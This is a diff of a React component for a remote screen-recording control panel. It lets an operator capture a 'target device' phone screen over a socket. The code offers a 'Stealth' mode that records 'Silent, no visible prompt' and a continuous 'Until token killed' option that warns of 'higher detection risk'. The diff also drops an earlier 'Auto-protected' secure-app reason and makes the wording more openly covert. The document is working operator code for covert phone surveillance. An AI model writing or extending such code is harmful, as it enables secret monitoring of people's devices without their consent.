@@ -1,10 +1,10 @@
 "use client";
 
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
 import {
     Video, Square, Play, Clock, Download, Trash2,
-    AlertTriangle, CheckCircle2, AlertCircle, X,
-    Zap, Shield, RefreshCw, Film, ChevronRight
+    AlertTriangle, CheckCircle, AlertCircle, X,
+    Zap, Shield, Repeat2, ChevronRight
 } from 'lucide-react';
 
 interface ScreenRecordViewProps {
@@ -25,745 +25,494 @@ interface SavedRecording {
     mode?: string;
 }
 
-const DURATION_OPTIONS = [
-    { label: '2 min',  value: 120 },
-    { label: '5 min',  value: 300 },
-    { label: '10 min', value: 600 },
+const DURATIONS = [
+    { label: '2m',  value: 120 },
+    { label: '5m',  value: 300 },
+    { label: '10m', value: 600 },
 ];
 
-function fmtMs(ms: number) {
-    const s  = Math.max(0, Math.floor(ms / 1000));
-    const m  = Math.floor(s / 60);
-    const ss = (s % 60).toString().padStart(2, '0');
-    return `${m}:${ss}`;
-}
+const STORAGE_KEY = (deviceId: string) => `asml_recs_${deviceId}`;
 
-function fmtSec(sec: number) {
-    if (sec <= 0) return 'Unlimited';
-    const m = Math.floor(sec / 60);
-    const s = sec % 60;
-    return s > 0 ? `${m}m ${s}s` : `${m}m`;
+function fmt(ms: number) {
+    const s = Math.floor(ms / 1000);
+    return `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`;
 }
 
 function fmtReason(r: string) {
-    if (r === 'duration_complete')   return 'Completed';
-    if (r === 'manual_stop')         return 'Stopped';
-    if (r === 'secure_app_detected') return 'Auto-protected';
-    if (r === 'encoder_error')       return 'Error';
-    if (r === 'token_released')      return 'Ended';
-    if (r === 'stealth_timeout')     return 'Timed out';
-    return r || 'Recorded';
+    if (r === 'duration_complete') return 'Completed';
+    if (r === 'manual_stop')      return 'Stopped';
+    if (r === 'token_released')   return 'Token released';
+    if (r === 'encoder_error')    return 'Error';
+    return 'Done';
+}
+
+function timeAgo(ts: number) {
+    const d = Math.floor((Date.now() - ts) / 1000);
+    if (d < 60)   return 'Just now';
+    if (d < 3600) return `${Math.floor(d / 60)}m ago`;
+    if (d < 86400) return `${Math.floor(d / 3600)}h ago`;
+    return new Date(ts).toLocaleDateString();
 }
 
 export default function ScreenRecordView({
-    socket,
-    userUuid,
-    selectedDeviceId,
-    isOnline,
-    deviceName
+    socket, userUuid, selectedDeviceId, isOnline, deviceName
 }: ScreenRecordViewProps) {
 
-    // ── Device State ──────────────────────────────────────────────────────────
-    const [hasToken, setHasToken] = useState<boolean | null>(null);
-    const [statusMsg, setStatusMsg] = useState<{ type: 'info' | 'warning' | 'success' | 'error'; text: string } | null>(null);
-
-    // ── Recording Config & State ──────────────────────────────────────────────
-    const [isRecording, setIsRecording] = useState(false);
-    const [recMode, setRecMode] = useState<'stealth' | 'simple'>('stealth');
-    const [recDuration, setRecDuration] = useState(300); // seconds, -1 = unlimited
-    const [customMin, setCustomMin] = useState('');
-    const [showCustom, setShowCustom] = useState(false);
+    const [hasToken,     setHasToken]     = useState<boolean | null>(null);
+    const [isRecording,  setIsRecording]  = useState(false);
+    const [pendingRec,   setPendingRec]   = useState(false);
+    const [recMode,      setRecMode]      = useState<'stealth' | 'simple'>('stealth');
+    const [recDuration,  setRecDuration]  = useState(300);
+    const [customMin,    setCustomMin]    = useState('');
+    const [showCustom,   setShowCustom]   = useState(false);
+    const [isUnlimited,  setIsUnlimited]  = useState(false);
     const [recElapsedMs, setRecElapsedMs] = useState(0);
-    const [recTotalMs, setRecTotalMs] = useState(0);
-    const [pendingRec, setPendingRec] = useState(false);
-
-    // ── Persistent Saved Recordings ───────────────────────────────────────────
-    const [savedRecs, setSavedRecs] = useState<SavedRecording[]>([]);
-
-    // ── Modals & Popups ───────────────────────────────────────────────────────
+    const [recTotalMs,   setRecTotalMs]   = useState(0);
+    const [savedRecs,    setSavedRecs]    = useState<SavedRecording[]>([]);
+    const [toast,        setToast]        = useState<{ type: 'ok'|'warn'|'err'; text: string } | null>(null);
+    const [playingRec,   setPlayingRec]   = useState<SavedRecording | null>(null);
     const [showSimpleWarn, setShowSimpleWarn] = useState(false);
-    const [showUnlimWarn, setShowUnlimWarn] = useState(false);
-    const [showStealthQueuedModal, setShowStealthQueuedModal] = useState(false);
-    const [activeVideo, setActiveVideo] = useState<SavedRecording | null>(null);
+    const [showUnlimWarn,  setShowUnlimWarn]  = useState(false);
 
     const isRecordingRef = useRef(false);
     isRecordingRef.current = isRecording;
 
-    const storageKey = `asml_screen_recordings_${selectedDeviceId || 'default'}`;
+    // ── Toast helper ──────────────────────────────────────────────────────────
+    const showToast = useCallback((type: 'ok'|'warn'|'err', text: string, ms = 4000) => {
+        setToast({ type, text });
+        setTimeout(() => setToast(null), ms);
+    }, []);
 
-    // Load persisted recordings on mount or device switch
+    // ── Persist recordings in localStorage ────────────────────────────────────
     useEffect(() => {
+        if (!selectedDeviceId) return;
         try {
-            const raw = localStorage.getItem(storageKey);
-            if (raw) {
-                const parsed = JSON.parse(raw);
-                if (Array.isArray(parsed)) {
-                    setSavedRecs(parsed);
-                }
-            } else {
-                setSavedRecs([]);
-            }
-        } catch {
-            setSavedRecs([]);
-        }
-    }, [storageKey]);
+            const raw = localStorage.getItem(STORAGE_KEY(selectedDeviceId));
+            if (raw) setSavedRecs(JSON.parse(raw));
+        } catch {}
+    }, [selectedDeviceId]);
 
-    // Save recordings helper
-    const updateSavedRecs = (updater: (prev: SavedRecording[]) => SavedRecording[]) => {
+    const persist = useCallback((recs: SavedRecording[], devId: string) => {
+        try { localStorage.setItem(STORAGE_KEY(devId), JSON.stringify(recs.slice(0, 20))); } catch {}
+    }, []);
+
+    const addRec = useCallback((rec: SavedRecording) => {
         setSavedRecs(prev => {
-            const updated = updater(prev);
-            try {
-                localStorage.setItem(storageKey, JSON.stringify(updated.slice(0, 30)));
-            } catch {}
-            return updated;
+            const next = [rec, ...prev.slice(0, 19)];
+            if (selectedDeviceId) persist(next, selectedDeviceId);
+            return next;
         });
-    };
+    }, [selectedDeviceId, persist]);
 
-    // ── Socket Events ─────────────────────────────────────────────────────────
+    const deleteRec = useCallback((id: string) => {
+        setSavedRecs(prev => {
+            const next = prev.filter(r => r.id !== id);
+            if (selectedDeviceId) persist(next, selectedDeviceId);
+            return next;
+        });
+    }, [selectedDeviceId, persist]);
+
+    // ── Socket ────────────────────────────────────────────────────────────────
     useEffect(() => {
         if (!socket) return;
-
         if (selectedDeviceId && isOnline) {
             socket.emit('screen_status_query', { uuid: userUuid, targetDeviceId: selectedDeviceId });
         }
 
-        const onScreenStatus = (data: any) => {
+        const onStatus = (data: any) => {
             if (!data) return;
             if (data.hasToken !== undefined) setHasToken(!!data.hasToken);
-
             switch (data.status) {
                 case 'token_needed':
-                    setHasToken(false);
-                    setPendingRec(true);
-                    setStatusMsg({ type: 'warning', text: 'Waiting for device authorization...' });
+                    setHasToken(false); setPendingRec(true);
                     break;
                 case 'authorized':
                     setHasToken(true);
-                    setStatusMsg({ type: 'success', text: 'Screen capture authorized.' });
                     break;
                 case 'recording_started':
-                    setIsRecording(true);
-                    setPendingRec(false);
+                    setIsRecording(true); setPendingRec(false);
                     setRecElapsedMs(0);
                     setRecTotalMs((data.durationSec || 0) * 1000);
-                    setStatusMsg(null);
+                    showToast('ok', '● Recording started');
                     break;
                 case 'stream_stopped':
                 case 'no_token':
-                    setHasToken(false);
-                    setIsRecording(false);
-                    setPendingRec(false);
+                    setHasToken(false); setIsRecording(false); setPendingRec(false);
                     break;
                 case 'stealth_timeout':
                     setPendingRec(false);
-                    setStatusMsg({ type: 'warning', text: 'Stealth session completed without capture.' });
+                    showToast('warn', 'Stealth timeout — no activity detected', 6000);
                     break;
                 case 'denied':
-                    setIsRecording(false);
-                    setPendingRec(false);
-                    setHasToken(false);
-                    setStatusMsg({ type: 'error', text: data.error || 'Permission was declined on device.' });
+                    setIsRecording(false); setPendingRec(false); setHasToken(false);
+                    showToast('err', data.error || 'Permission denied');
                     break;
-                default:
-                    if (data.error) setStatusMsg({ type: 'error', text: data.error });
             }
         };
 
-        const onRecProgress = (data: any) => {
+        const onProgress = (data: any) => {
             if (!data) return;
-            setIsRecording(true);
-            setPendingRec(false);
+            setIsRecording(true); setPendingRec(false);
             setRecElapsedMs(data.elapsedMs || 0);
             setRecTotalMs(data.totalMs || 0);
         };
 
-        const onRecComplete = (data: any) => {
+        const onComplete = (data: any) => {
             if (!data) return;
-            setIsRecording(false);
-            setPendingRec(false);
-            setRecElapsedMs(0);
-            setRecTotalMs(0);
-
+            setIsRecording(false); setPendingRec(false);
+            setRecElapsedMs(0); setRecTotalMs(0);
             if (data.url) {
-                const rec: SavedRecording = {
-                    id:        `rec_${Date.now()}`,
-                    url:       data.url,
+                addRec({
+                    id: `rec_${Date.now()}`,
+                    url: data.url,
                     timestamp: data.timestamp || Date.now(),
                     elapsedMs: data.elapsedMs || 0,
                     totalMs:   data.totalMs   || 0,
-                    reason:    data.reason    || 'completed',
+                    reason:    data.reason    || 'unknown',
                     mode:      data.mode
-                };
-                updateSavedRecs(prev => [rec, ...prev.filter(r => r.id !== rec.id)]);
-                setStatusMsg({ type: 'success', text: `New recording ready (${fmtMs(data.elapsedMs || 0)})` });
-            } else {
-                setStatusMsg({ type: 'warning', text: `Recording finished: ${fmtReason(data.reason || 'completed')}` });
+                });
+                showToast('ok', `Saved — ${fmt(data.elapsedMs || 0)}`);
             }
         };
 
-        socket.on('screen_status',       onScreenStatus);
-        socket.on('screen_rec_progress', onRecProgress);
-        socket.on('screen_rec_complete', onRecComplete);
+        socket.on('screen_status',       onStatus);
+        socket.on('screen_rec_progress', onProgress);
+        socket.on('screen_rec_complete', onComplete);
 
         return () => {
             if (isRecordingRef.current) {
                 socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
             }
-            socket.off('screen_status',       onScreenStatus);
-            socket.off('screen_rec_progress', onRecProgress);
-            socket.off('screen_rec_complete', onRecComplete);
+            socket.off('screen_status',       onStatus);
+            socket.off('screen_rec_progress', onProgress);
+            socket.off('screen_rec_complete', onComplete);
         };
-    }, [socket, selectedDeviceId, isOnline, userUuid, storageKey]);
-
-    // Auto-clear status messages
-    useEffect(() => {
-        if (!statusMsg || statusMsg.type === 'warning' || statusMsg.type === 'error') return;
-        const t = setTimeout(() => setStatusMsg(null), 5000);
-        return () => clearTimeout(t);
-    }, [statusMsg]);
+    }, [socket, selectedDeviceId, isOnline, userUuid, showToast, addRec]);
 
     // ── Actions ───────────────────────────────────────────────────────────────
-    const handleStartRecord = () => {
-        if (!selectedDeviceId || !isOnline || !socket || isRecording || pendingRec) return;
-
-        if (recMode === 'simple') {
-            setShowSimpleWarn(true);
-            return;
-        }
-
-        if (recDuration === -1 && recMode === 'stealth') {
-            setShowUnlimWarn(true);
-            return;
-        }
-
-        fireStartRecord();
-    };
-
-    const fireStartRecord = () => {
+    const fireStart = useCallback(() => {
         if (!selectedDeviceId || !socket) return;
-        const duration = recDuration === -1 ? 86400 : recDuration;
-        setPendingRec(true);
-        setRecElapsedMs(0);
-        setRecTotalMs(duration * 1000);
-
+        const duration = isUnlimited ? 86400 : recDuration;
+        setPendingRec(true); setRecElapsedMs(0); setRecTotalMs(duration * 1000);
         socket.emit('screen_record_start', {
-            uuid:           userUuid,
-            targetDeviceId: selectedDeviceId,
-            duration,
-            mode:           recMode
+            uuid: userUuid, targetDeviceId: selectedDeviceId, duration, mode: recMode
         });
+        if (recMode === 'stealth') showToast('ok', 'Stealth armed');
+        else showToast('warn', 'Prompt sent to phone...');
+    }, [selectedDeviceId, socket, userUuid, recMode, recDuration, isUnlimited, showToast]);
 
-        if (recMode === 'stealth') {
-            setShowStealthQueuedModal(true);
-        } else {
-            setStatusMsg({ type: 'info', text: 'Prompt dispatched to target device.' });
-        }
+    const handleStart = () => {
+        if (!selectedDeviceId || !isOnline || !socket || isRecording || pendingRec) return;
+        if (recMode === 'simple') { setShowSimpleWarn(true); return; }
+        if (isUnlimited)          { setShowUnlimWarn(true); return; }
+        fireStart();
     };
 
-    const handleStopRecord = () => {
+    const handleStop = () => {
         if (!selectedDeviceId || !socket) return;
         socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
-        setIsRecording(false);
-        setPendingRec(false);
-        setRecElapsedMs(0);
-        setRecTotalMs(0);
+        setIsRecording(false); setPendingRec(false);
     };
 
-    const handleCustomInput = (val: string) => {
-        setCustomMin(val);
-        const n = parseInt(val, 10);
-        if (!isNaN(n) && n >= 1 && n <= 10) {
-            setRecDuration(n * 60);
-        }
-    };
+    const pct = recTotalMs > 0 ? Math.min((recElapsedMs / recTotalMs) * 100, 100) : 0;
 
-    const handleDeleteRecording = (id: string, e: React.MouseEvent) => {
-        e.stopPropagation();
-        updateSavedRecs(prev => prev.filter(r => r.id !== id));
-    };
-
-    const handleClearAll = () => {
-        updateSavedRecs(() => []);
-    };
-
-    const progressPct = recTotalMs > 0
-        ? Math.min((recElapsedMs / recTotalMs) * 100, 100)
-        : 0;
-
-    const isUnlimited = recDuration === -1;
-
+    // ── Render ────────────────────────────────────────────────────────────────
     return (
-        <div className="w-full max-w-xl mx-auto space-y-3.5 pb-24 px-3 sm:px-4 animate-in fade-in duration-200">
+        <div className="relative w-full max-w-xl mx-auto space-y-2.5 pb-24 px-3 sm:px-0">
 
-            {/* ── Status Toast ── */}
-            {statusMsg && (
-                <div className={`px-4 py-2.5 rounded-2xl text-xs font-mono flex items-center justify-between gap-3 border shadow-md animate-in slide-in-from-top-2 ${
-                    statusMsg.type === 'warning' ? 'bg-amber-500/10 text-amber-300 border-amber-500/30'
-                  : statusMsg.type === 'error'   ? 'bg-rose-500/10 text-rose-300 border-rose-500/30'
-                  : statusMsg.type === 'success' ? 'bg-emerald-500/10 text-emerald-300 border-emerald-500/30'
-                  : 'bg-orange-500/10 text-orange-300 border-orange-500/30'
+            {/* ── Toast ──────────────────────────────────────────────────────── */}
+            {toast && (
+                <div className={`fixed top-4 left-1/2 -translate-x-1/2 z-[600] flex items-center gap-2.5 px-4 py-2.5 rounded-2xl text-xs font-semibold shadow-xl backdrop-blur-xl border transition-all animate-in slide-in-from-top-3 ${
+                    toast.type === 'ok'   ? 'bg-emerald-900/80 border-emerald-500/30 text-emerald-300'
+                  : toast.type === 'err'  ? 'bg-rose-900/80    border-rose-500/30    text-rose-300'
+                  :                         'bg-amber-900/80   border-amber-500/30   text-amber-300'
                 }`}>
-                    <div className="flex items-center gap-2">
-                        {statusMsg.type === 'success' ? <CheckCircle2 size={14} className="shrink-0" /> : <AlertCircle size={14} className="shrink-0" />}
-                        <span>{statusMsg.text}</span>
-                    </div>
-                    <button onClick={() => setStatusMsg(null)} className="text-white/40 hover:text-white cursor-pointer px-1">✕</button>
+                    {toast.type === 'ok' ? <CheckCircle size={13}/> : <AlertCircle size={13}/>}
+                    {toast.text}
                 </div>
             )}
 
-            {/* ── Device & Token Status Pill ── */}
-            <div className="clay-card p-3 flex items-center justify-between">
-                <div className="flex items-center gap-2.5">
-                    <span className={`w-2.5 h-2.5 rounded-full ${isOnline ? 'bg-emerald-400 shadow-[0_0_8px_#34d399]' : 'bg-rose-500'}`} />
-                    <div>
-                        <div className="text-xs font-bold text-white tracking-wide">{deviceName || 'Select Device'}</div>
-                        <div className="text-[10px] text-white/40 font-mono">{isOnline ? 'Device Connected' : 'Offline'}</div>
-                    </div>
+            {/* ── Device pill ────────────────────────────────────────────────── */}
+            <div className="flex items-center justify-between px-1">
+                <div className="flex items-center gap-1.5">
+                    <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400' : 'bg-white/20'}`}/>
+                    <span className="text-[11px] text-white/30 font-medium tracking-wide">{deviceName || 'No device selected'}</span>
                 </div>
-
-                <div className="flex items-center gap-2">
-                    {hasToken !== null && (
-                        <span className={`text-[10px] font-mono font-bold px-2.5 py-1 rounded-full ${
-                            hasToken ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/25'
-                                     : 'bg-white/5 text-white/40 border border-white/10'
-                        }`}>
-                            {hasToken ? 'Ready' : 'Standby'}
-                        </span>
-                    )}
-                </div>
+                {hasToken !== null && (
+                    <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${
+                        hasToken ? 'bg-emerald-500/10 text-emerald-400' : 'bg-white/5 text-white/20'
+                    }`}>{hasToken ? 'Active' : 'No token'}</span>
+                )}
             </div>
 
-            {/* ── Mode Selection ── */}
-            <div className="clay-card p-3.5 space-y-2.5">
-                <div className="flex items-center justify-between px-1">
-                    <span className="text-[10px] font-mono font-black uppercase tracking-widest text-white/40">Recording Mode</span>
-                    <span className="text-[10px] font-mono text-orange-400 font-bold">{recMode === 'stealth' ? 'Recommended' : 'Standard'}</span>
-                </div>
-
+            {/* ── Mode ───────────────────────────────────────────────────────── */}
+            <div className="clay-card p-3 space-y-2">
+                <p className="text-[10px] font-semibold uppercase tracking-widest text-white/20 px-0.5">Mode</p>
                 <div className="grid grid-cols-2 gap-2">
-                    {/* Stealth Button */}
-                    <button
-                        type="button"
-                        onClick={() => setRecMode('stealth')}
-                        disabled={isRecording || pendingRec}
-                        className={`p-3 rounded-2xl text-left transition-all cursor-pointer disabled:opacity-40 border ${
-                            recMode === 'stealth'
-                                ? 'bg-orange-500/15 border-orange-500/60 shadow-[0_0_20px_rgba(249,115,22,0.2)]'
-                                : 'bg-white/5 border-white/10 hover:border-white/20'
-                        }`}
-                    >
-                        <div className="flex items-center gap-1.5 mb-1">
-                            <Shield size={14} className={recMode === 'stealth' ? 'text-orange-400' : 'text-white/40'} />
-                            <span className={`text-xs font-black uppercase tracking-wider ${recMode === 'stealth' ? 'text-orange-300' : 'text-white/60'}`}>
-                                Stealth
-                            </span>
-                        </div>
-                        <p className="text-[10px] text-white/40 leading-relaxed font-mono">
-                            Completely silent. Captures without on-screen prompts.
-                        </p>
-                    </button>
-
-                    {/* Simple Button */}
-                    <button
-                        type="button"
-                        onClick={() => setRecMode('simple')}
-                        disabled={isRecording || pendingRec}
-                        className={`p-3 rounded-2xl text-left transition-all cursor-pointer disabled:opacity-40 border ${
-                            recMode === 'simple'
-                                ? 'bg-orange-500/15 border-orange-500/60 shadow-[0_0_20px_rgba(249,115,22,0.2)]'
-                                : 'bg-white/5 border-white/10 hover:border-white/20'
-                        }`}
-                    >
-                        <div className="flex items-center gap-1.5 mb-1">
-                            <Zap size={14} className={recMode === 'simple' ? 'text-orange-400' : 'text-white/40'} />
-                            <span className={`text-xs font-black uppercase tracking-wider ${recMode === 'simple' ? 'text-orange-300' : 'text-white/60'}`}>
-                                Standard
-                            </span>
-                        </div>
-                        <p className="text-[10px] text-white/40 leading-relaxed font-mono">
-                            Sends direct permission prompt to device screen.
-                        </p>
-                    </button>
-                </div>
-            </div>
-
-            {/* ── Duration Selector ── */}
-            <div className="clay-card p-3.5 space-y-2.5">
-                <span className="text-[10px] font-mono font-black uppercase tracking-widest text-white/40 px-1">Duration</span>
-
-                <div className="grid grid-cols-4 gap-1.5">
-                    {DURATION_OPTIONS.map(opt => (
-                        <button
-                            key={opt.value}
-                            type="button"
-                            onClick={() => { setRecDuration(opt.value); setShowCustom(false); setCustomMin(''); }}
+                    {([['stealth', 'Stealth', Shield], ['simple', 'Simple', Zap]] as const).map(([val, label, Icon]) => (
+                        <button key={val}
+                            onClick={() => setRecMode(val)}
                             disabled={isRecording || pendingRec}
-                            className={`py-2 rounded-xl text-xs font-bold font-mono transition-all cursor-pointer disabled:opacity-40 ${
-                                recDuration === opt.value && !showCustom && recDuration !== -1
-                                    ? 'bg-orange-500 text-white shadow-[0_0_12px_rgba(249,115,22,0.4)]'
-                                    : 'bg-white/5 text-white/60 hover:text-white hover:bg-white/10'
+                            className={`group relative p-3 rounded-xl text-left transition-all disabled:opacity-40 border overflow-hidden ${
+                                recMode === val
+                                    ? 'bg-orange-500/10 border-orange-500/40'
+                                    : 'bg-white/[0.03] border-white/[0.06] hover:border-white/10'
                             }`}
                         >
-                            {opt.label}
+                            <Icon size={14} className={recMode === val ? 'text-orange-400 mb-1.5' : 'text-white/25 mb-1.5'} />
+                            <p className={`text-xs font-bold ${recMode === val ? 'text-white' : 'text-white/40'}`}>{label}</p>
+                            <p className="text-[10px] text-white/20 mt-0.5 leading-relaxed">
+                                {val === 'stealth' ? 'Silent, no visible prompt' : 'Prompt appears on phone'}
+                            </p>
                         </button>
                     ))}
+                </div>
+            </div>
 
+            {/* ── Duration ───────────────────────────────────────────────────── */}
+            <div className="clay-card p-3 space-y-2">
+                <p className="text-[10px] font-semibold uppercase tracking-widest text-white/20 px-0.5">Duration</p>
+                <div className="flex gap-1.5">
+                    {DURATIONS.map(d => (
+                        <button key={d.value}
+                            onClick={() => { setRecDuration(d.value); setIsUnlimited(false); setShowCustom(false); setCustomMin(''); }}
+                            disabled={isRecording || pendingRec}
+                            className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 ${
+                                recDuration === d.value && !showCustom && !isUnlimited
+                                    ? 'bg-orange-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.3)]'
+                                    : 'bg-white/5 text-white/40 hover:text-white/70'
+                            }`}
+                        >{d.label}</button>
+                    ))}
                     <button
-                        type="button"
-                        onClick={() => { setShowCustom(true); setRecDuration(0); }}
+                        onClick={() => { setShowCustom(true); setIsUnlimited(false); setRecDuration(0); }}
                         disabled={isRecording || pendingRec}
-                        className={`py-2 rounded-xl text-xs font-bold font-mono transition-all cursor-pointer disabled:opacity-40 ${
-                            showCustom
-                                ? 'bg-orange-500 text-white shadow-[0_0_12px_rgba(249,115,22,0.4)]'
-                                : 'bg-white/5 text-white/60 hover:text-white hover:bg-white/10'
+                        className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 ${
+                            showCustom ? 'bg-orange-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.3)]' : 'bg-white/5 text-white/40 hover:text-white/70'
                         }`}
-                    >
-                        Custom
-                    </button>
+                    >Custom</button>
                 </div>
 
-                {/* Custom Input */}
                 {showCustom && (
-                    <div className="flex items-center gap-2 bg-black/40 rounded-xl px-3 py-2 border border-orange-500/30 animate-in slide-in-from-top-1">
+                    <div className="flex items-center gap-2 bg-black/30 rounded-xl px-3 py-2 border border-orange-500/20">
                         <input
-                            type="number"
-                            min={1}
-                            max={10}
-                            value={customMin}
-                            onChange={e => handleCustomInput(e.target.value)}
+                            type="number" min={1} max={10} value={customMin}
+                            onChange={e => {
+                                setCustomMin(e.target.value);
+                                const n = parseInt(e.target.value, 10);
+                                if (!isNaN(n) && n >= 1 && n <= 10) setRecDuration(n * 60);
+                            }}
                             placeholder="1–10"
-                            className="bg-transparent text-white text-sm font-mono w-16 outline-none placeholder:text-white/20"
+                            className="bg-transparent text-white text-sm font-semibold w-12 outline-none placeholder:text-white/20"
                         />
-                        <span className="text-xs text-white/40 font-mono">minutes (up to 10m)</span>
-                        {recDuration > 0 && (
-                            <span className="ml-auto text-xs text-orange-400 font-mono font-bold">{fmtSec(recDuration)}</span>
-                        )}
+                        <span className="text-[10px] text-white/25">min (max 10)</span>
+                        {recDuration > 0 && <span className="ml-auto text-xs text-orange-400 font-bold">{recDuration / 60}m</span>}
                     </div>
                 )}
 
-                {/* Unlimited Option */}
                 <button
-                    type="button"
-                    onClick={() => { setRecDuration(-1); setShowCustom(false); setCustomMin(''); }}
+                    onClick={() => { setIsUnlimited(!isUnlimited); setShowCustom(false); setCustomMin(''); }}
                     disabled={isRecording || pendingRec}
-                    className={`w-full py-2 px-3 rounded-xl text-xs font-bold font-mono flex items-center justify-between transition-all cursor-pointer disabled:opacity-40 border ${
+                    className={`w-full py-2 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 transition-all disabled:opacity-40 border ${
                         isUnlimited
-                            ? 'bg-amber-500/15 border-amber-500/40 text-amber-300 shadow-[0_0_12px_rgba(245,158,11,0.2)]'
-                            : 'bg-white/3 border-white/5 text-white/40 hover:border-white/15 hover:text-white/70'
+                            ? 'bg-amber-500/10 border-amber-500/30 text-amber-300'
+                            : 'bg-white/[0.02] border-white/[0.06] text-white/25 hover:text-white/40'
                     }`}
                 >
-                    <div className="flex items-center gap-2">
-                        <span>Continuous Session</span>
-                        <span className="text-[10px] text-white/30 font-normal">(Until Stopped)</span>
-                    </div>
-                    {isUnlimited && <span className="text-[10px] text-amber-400 font-mono">Active</span>}
+                    <Repeat2 size={12}/>
+                    <span>Until token killed</span>
+                    {isUnlimited && <span className="text-[10px] text-amber-400/50 ml-1">— higher detection risk</span>}
                 </button>
             </div>
 
-            {/* ── Main Action & Progress ── */}
-            <div className="clay-card p-3.5 space-y-3">
+            {/* ── Record button / state ──────────────────────────────────────── */}
+            <div className="clay-card p-3">
                 {!isRecording && !pendingRec ? (
                     <button
-                        type="button"
-                        onClick={handleStartRecord}
+                        onClick={handleStart}
                         disabled={!isOnline || !selectedDeviceId || (showCustom && recDuration <= 0)}
-                        className="w-full py-3.5 rounded-2xl font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 transition-all cursor-pointer shadow-lg disabled:opacity-40 disabled:cursor-not-allowed bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-400 hover:to-amber-400 text-white shadow-[0_4px_24px_rgba(249,115,22,0.35)]"
+                        className={`w-full py-3.5 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all disabled:opacity-30 disabled:cursor-not-allowed shadow-lg ${
+                            recMode === 'stealth'
+                                ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_4px_20px_rgba(249,115,22,0.35)]'
+                                : 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_4px_20px_rgba(249,115,22,0.35)]'
+                        } hover:brightness-110 active:scale-[0.99]`}
                     >
-                        <Play size={14} className="fill-current" />
-                        {recMode === 'stealth' ? 'Queue Stealth Recording' : 'Start Screen Recording'}
+                        <Play size={15} className="fill-current"/>
+                        {recMode === 'stealth' ? 'Arm Stealth' : 'Start Recording'}
                     </button>
 
                 ) : pendingRec && !isRecording ? (
-                    /* Queued / Waiting State Card */
-                    <div className="space-y-2.5">
-                        <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between">
-                            <div className="flex items-center gap-2.5">
-                                <Clock size={16} className="text-amber-400 animate-spin" />
-                                <div>
-                                    <div className="text-xs font-bold text-amber-300">
-                                        {recMode === 'stealth' ? 'Stealth Recording Queued' : 'Waiting for Screen Approval...'}
-                                    </div>
-                                    <div className="text-[10px] text-amber-300/60 font-mono">
-                                        {recMode === 'stealth'
-                                            ? 'Target session will begin automatically in background'
-                                            : 'Prompt active on device screen'}
-                                    </div>
-                                </div>
-                            </div>
+                    <div className="space-y-2">
+                        <div className="flex items-center gap-3 py-3 px-4 rounded-xl bg-amber-500/8 border border-amber-500/20">
+                            <Clock size={14} className="text-amber-400 animate-spin shrink-0"/>
+                            <span className="text-xs font-medium text-amber-300/80">
+                                {recMode === 'stealth' ? 'Armed — waiting for activity...' : 'Waiting for permission...'}
+                            </span>
                         </div>
-
-                        <button
-                            type="button"
-                            onClick={handleStopRecord}
-                            className="w-full py-2.5 rounded-xl text-xs font-mono text-white/50 hover:text-rose-400 hover:bg-rose-500/10 transition-all cursor-pointer border border-white/10"
-                        >
-                            Cancel Request
-                        </button>
+                        <button onClick={handleStop}
+                            className="w-full py-2 rounded-xl text-[11px] text-white/25 hover:text-rose-400 hover:bg-rose-500/8 transition-all border border-transparent hover:border-rose-500/15"
+                        >Cancel</button>
                     </div>
 
                 ) : (
-                    /* Active Recording Progress */
-                    <div className="space-y-3">
-                        <div className="flex items-center justify-between text-xs">
-                            <div className="flex items-center gap-2 text-rose-400">
-                                <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-pulse shadow-[0_0_8px_#f43f5e]" />
-                                <span className="font-black uppercase tracking-wider">Recording in Progress</span>
+                    <div className="space-y-2.5">
+                        <div className="flex items-center justify-between">
+                            <div className="flex items-center gap-2">
+                                <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse shadow-[0_0_8px_#f43f5e]"/>
+                                <span className="text-xs font-bold text-white/80">Recording</span>
                             </div>
-                            <span className="font-mono text-white/70 font-bold">
-                                {fmtMs(recElapsedMs)} {recTotalMs > 0 && !isUnlimited ? `/ ${fmtMs(recTotalMs)}` : ''}
+                            <span className="text-xs font-mono text-white/40">
+                                {fmt(recElapsedMs)}{recTotalMs > 0 && !isUnlimited ? ` / ${fmt(recTotalMs)}` : ''}
                             </span>
                         </div>
-
                         {!isUnlimited && recTotalMs > 0 && (
-                            <div className="h-2 rounded-full bg-white/10 overflow-hidden">
-                                <div
-                                    className="h-full rounded-full bg-gradient-to-r from-orange-500 to-rose-500 transition-all duration-1000"
-                                    style={{ width: `${progressPct}%` }}
-                                />
+                            <div className="h-1 rounded-full bg-white/5 overflow-hidden">
+                                <div className="h-full rounded-full bg-gradient-to-r from-orange-500 to-amber-400 transition-all duration-1000" style={{ width: `${pct}%` }}/>
                             </div>
                         )}
-
-                        <button
-                            type="button"
-                            onClick={handleStopRecord}
-                            className="w-full py-2.5 rounded-xl text-xs font-bold font-mono flex items-center justify-center gap-2 bg-rose-500/15 border border-rose-500/40 text-rose-300 hover:bg-rose-500/25 transition-all cursor-pointer"
+                        <button onClick={handleStop}
+                            className="w-full py-2.5 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 bg-rose-500/10 border border-rose-500/20 text-rose-400 hover:bg-rose-500/15 transition-all"
                         >
-                            <Square size={13} className="fill-current" />
-                            Stop & Save Video
+                            <Square size={11} className="fill-current"/> Stop
                         </button>
                     </div>
                 )}
             </div>
 
